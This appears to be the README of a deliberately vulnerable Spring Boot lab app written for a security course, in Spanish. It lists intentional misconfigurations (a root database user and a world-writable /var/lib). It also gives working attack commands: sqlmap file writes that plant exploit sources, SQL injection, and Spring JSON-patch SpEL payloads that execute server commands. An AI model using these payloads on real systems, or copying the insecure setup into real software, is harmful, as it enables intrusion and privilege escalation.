# AppVulnerable

## Errores de Configuración en el Server:

1. La aplicación utiliza el usuario de root para acceder a la base de datos.
2. Se encuentra configurado para que todos los usuarios tengan permisos para las carpetas
chmod -R a+rwX /var/lib/

## Pasos previos

Se debe tener corriendo una base de datos mysql y ejecutar los scripts que estan dentro de la carpeta script para crear la tabla y el usuario que la app usa

## Requests que explotan vulnerabilidades

sqlmap.py -u http://hostname:8080/users/123?id=1 --file-write=C:/tp-seguridad/hello.c --file-dest=/var/lib/mysql-files/hello.c

sqlmap.py -u http://hostname:8080/users/123?id=1 --file-write=C:/tp-seguridad/compile.sh --file-dest=/var/lib/mysql-files/compile.sh

sqlmap.py -u http://hostname:8080/users/123?id=1 --file-write=C:/tp-seguridad/suidhelper.c --file-dest=/var/lib/mysql-files/suidhelper.c

sqlmap.py -u http://hostname:8080/users/123?id=1 --file-write=C:/tp-seguridad/doubleput.c --file-dest=/var/lib/mysql-files/doubleput.c

- curl -X GET localhost:8080/users?id=6%20OR%201=1
	- id es un campo vulnerable a sql injection

- curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(java.lang.Runtime).getRuntime().exec(\"[comando]\").x", "value" : "pwned" }]' "http://hostname:port/entity/1/"
	- Ejecuta comandos del lado del servidor
	- Pervio a esto se debe crear la /entity/1/ con -> curl -i -X POST -H "Content-Type: application/json" -d '{ "name" : "Test", "attribute" : "foo"}' http://hostname:port/entity

- curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"ipconfig\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x", "value" : "pwned" }]' "http://hostname:port/entity/1/"
	- Permite ver el output de la ejecucion del comando


## Frontend

Actualmente se levanta lo que este en /src/main/resources/*
Ir al directorio donde esta la aplicacion y correr

- mvn clean install
    - Agrega las dependencias para la carga de template thymeleaf y dependencias para el frontend, tambien crea el directorio
    /src/front/dist y copia los archivos generados a /src/main/resources/static

- mvn spring-boot:run
    - Levanta la aplicacion en el puerto 8080


